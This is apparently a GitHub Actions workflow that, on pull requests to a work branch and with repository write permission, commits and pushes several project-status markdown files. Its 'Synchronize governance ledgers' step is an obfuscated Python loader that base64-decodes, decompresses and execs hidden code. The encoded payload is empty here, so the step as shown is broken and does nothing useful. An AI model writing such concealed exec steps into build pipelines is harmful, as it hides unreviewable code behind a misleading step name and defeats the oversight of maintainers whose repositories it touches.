name: UI Taste Governance Closeout

on:
  pull_request:
    branches:
      - work/ui-taste-priority-1

permissions:
  contents: write

jobs:
  closeout:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Checkout work branch
        uses: actions/checkout@v4
        with:
          ref: work/ui-taste-priority-1
          fetch-depth: 0

      - name: Synchronize governance ledgers
        shell: bash
        run: |
          python -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('')).decode())"

      - name: Commit governance closeout
        shell: bash
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add PROJECT_STATE.md MODULE_STATUS.md IMPLEMENTATION_TRACKER.md CHANGELOG.md VALIDATION_RESULTS.md ROADMAP.md
          git diff --cached --check
          if git diff --cached --quiet; then
            echo "Governance ledgers already synchronized."
            exit 0
          fi
          git commit -m "docs(ui): record priority 1 validation"
          git push origin HEAD:work/ui-taste-priority-1
